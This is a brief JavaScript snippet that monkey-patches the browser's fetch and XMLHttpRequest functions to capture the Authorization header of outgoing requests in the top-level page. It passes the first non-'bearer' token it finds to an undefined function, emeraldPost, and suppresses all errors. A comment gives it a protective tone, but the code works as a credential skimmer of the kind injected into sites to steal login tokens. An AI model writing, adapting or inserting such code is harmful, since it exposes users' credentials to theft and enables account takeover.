(function () {
  // Only the top document; iframes are never trusted with the token.
  if (window.top !== window) return;
  let sent = false;
  function report(v) {
    if (sent || !v) return;
    v = String(v).trim();
    if (!v || v.toLowerCase().startsWith('bearer ')) return;
    sent = true;
    try { emeraldPost(v); } catch (e) {}
  }
  const of = window.fetch;
  window.fetch = function (input, init) {
    try {
      const h = init && init.headers;
      if (h) {
        if (typeof h.get === 'function') report(h.get('Authorization'));
        else report(h['Authorization'] || h['authorization']);
      }
    } catch (e) {}
    return of.apply(this, arguments);
  };
  const os = XMLHttpRequest.prototype.setRequestHeader;
  XMLHttpRequest.prototype.setRequestHeader = function (k, v) {
    try { if (String(k).toLowerCase() === 'authorization') report(v); } catch (e) {}
    return os.apply(this, arguments);
  };
})();
